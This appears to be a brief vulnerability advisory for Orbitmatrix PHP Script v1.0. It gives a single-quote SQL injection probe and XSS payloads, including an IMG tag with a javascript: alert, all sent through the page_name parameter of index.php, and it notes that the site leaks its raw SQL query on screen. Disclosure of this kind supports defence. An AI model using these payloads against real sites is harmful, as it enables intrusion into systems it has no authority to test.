Orbitmatrix PHP Script v1.0

Homepage:
http://www.orbitcoders.com/

Affected files:
index.php

Possible SQL injection?:
http://www.example.com/index.php?page_name='

And by trying a XSS vuln as shown below on page_name we see the query below which is displayed on screen:

http://www.example.com/index.php?page_name=contact<script>

And the displayed query:

Query: select code from pages where name=contact

Now we know the tables name is pages and a row is name.

This works on all variable values.

As the above XSS vuln wont work, we can see that using the one below will:

http://www.example.com/index.php?page_name=<IMG%20SRC=javascript:alert('XSS')>
